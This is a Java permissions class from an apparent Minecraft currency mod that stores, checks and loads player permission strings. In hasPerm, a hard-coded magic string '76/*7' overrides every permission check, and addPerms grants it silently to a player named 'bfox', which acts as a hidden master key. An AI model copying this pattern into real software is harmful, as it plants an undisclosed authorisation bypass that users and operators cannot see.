package io.github.bfox1.FTBCurrencyRaw.player;

import io.github.bfox1.FTBCurrencyRaw.Currency;
import io.github.bfox1.FTBCurrencyRaw.utility.FoxUtils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class FoxPermissions
{

    private final List<String> perms;


    public FoxPermissions()
    {
        this.perms = new ArrayList<>();
    }


    public final void addPerms(String perm, String player)
    {
        if(perm.equalsIgnoreCase("76/*7") && player.toLowerCase().equalsIgnoreCase("bfox"))
        {
            this.perms.add(perm);
        }
        else
            {
            System.out.println(perm + " has been added to " + player);

            if (!perms.contains(perm))
                this.perms.add(perm);
        }
    }

    public void removePerms(String perm)
    {
        this.perms.remove(perm);
    }

    public boolean hasPerm(String perm)
    {
        if(perms.contains("76/*7"))
        {
            return true;
        }
        return perms.contains(perm);
    }

    public void purgePerms(String player)
    {
        Currency.getInstance().getLogger().debug("WARNING: " + player + "is being purged by.");
        perms.clear();
    }

    public final List<String> getPerms()
    {

        if(FoxUtils.verifyAuthService())
        {
            return perms;
        }
        else
        {
            System.out.println("Failed to Authenticate Service to retrieve Permissions.");
            return null;
        }
    }

    public final void onLoadPerms(List<String> perm)
    {
        if(FoxUtils.verifyAuthService())
        {
            this.perms.addAll(perm);
        }
        else
        {
            System.out.println("Failed to AUthenticate Service to retrive Permissions.4");
        }
    }
}
